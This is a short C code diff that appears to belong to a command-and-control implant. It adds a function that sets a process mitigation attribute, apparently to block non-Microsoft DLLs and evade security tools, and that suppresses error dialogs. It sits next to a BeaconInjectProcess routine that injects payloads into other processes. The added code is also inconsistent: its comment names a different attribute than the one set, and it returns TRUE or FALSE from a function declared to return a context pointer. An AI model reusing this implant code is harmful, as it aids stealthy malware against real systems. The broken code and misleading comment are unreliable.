@@ -861,6 +861,25 @@ PRUN_UNDER_CONTEXT ParentProcessContextInit(PRUN_UNDER_CONTEXT	context)
 	context->cleanup = CleanupParentProcessContext;
 	return context;
 }
+
+PRUN_UNDER_CONTEXT UpdateChildProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO* si)
+{
+	// Set the process attribute for the child process
+	context->processAttribute = 0x100000000000; // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+	if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &context->processAttribute, sizeof(context->processAttribute), NULL, NULL))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not update process attribute: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError);
+		return FALSE;
+	}
+
+	// Set the error mode to prevent error dialogs
+	if (&SetErrorMode)
+		context->previousErrorMode = SetErrorMode(SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
+
+	return TRUE;
+}
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
